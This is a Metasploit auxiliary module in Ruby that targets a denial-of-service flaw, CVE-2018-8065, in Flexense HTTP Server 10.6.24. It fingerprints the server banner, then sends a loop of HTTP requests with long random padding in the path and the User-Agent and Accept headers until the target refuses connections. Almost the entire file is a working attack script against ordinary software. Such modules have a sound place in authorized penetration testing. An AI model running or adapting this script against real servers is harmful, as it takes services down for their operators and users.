##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Dos
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Flexense HTTP Server Denial Of Service',
      'Description'    => %q{
        This module triggers a Denial of Service vulnerability in the Flexense HTTP server.
        Vulnerability caused by a user mode write access memory violation and can be triggered with rapidly sending variety of HTTP requests with long HTTP header values.
        Multiple Flexense applications that are using Flexense HTTP server 10.6.24 and below vesions reportedly vulnerable.
      },
      'Author' 		=> [ 'Ege Balci <ege.balci@invictuseurope.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2018-8065'],
          [ 'URL', 'https://github.com/EgeBalci/Sync_Breeze_Enterprise_10_6_24_-DOS' ],
        ],
      'DisclosureDate' => 'Mar 09 2018'))

    register_options(
      [
        Opt::RPORT(80),
      ])

  end

  def check
    begin
      connect
      sock.put("GET / HTTP/1.0\r\n\r\n")
      res = sock.get
      if res and res.include? 'Flexense HTTP Server v10.6.24'
        Exploit::CheckCode::Vulnerable
      else
        Exploit::CheckCode::Unknown
      end
    rescue
      Exploit::CheckCode::Unknown
    end
  end

  def run
    unless check == Exploit::CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

    print_status('Triggering the vulnerability')
    loop do
      payload = ""
      payload << "GET /"+('A'*rand(8000))+" HTTP/0.9\n"
      payload << "Host: 127.0.0.1\n"
      payload << "User-Agent: Mozilla"+('A'*rand(8000))+"\n"
      payload << "Accept: "+('A'*rand(8000))+"\r\n\r\n"
      begin
        connect
        sock.put(payload)
        disconnect
      rescue ::Rex::ConnectionTimeout
        print_error('Connection timeout !')
      rescue ::Errno::ECONNRESET
        print_error('Connection reset !')
      rescue ::Rex::ConnectionRefused
        print_good("DoS successful #{rhost} is down !")
        break
      end
    end
  end
end
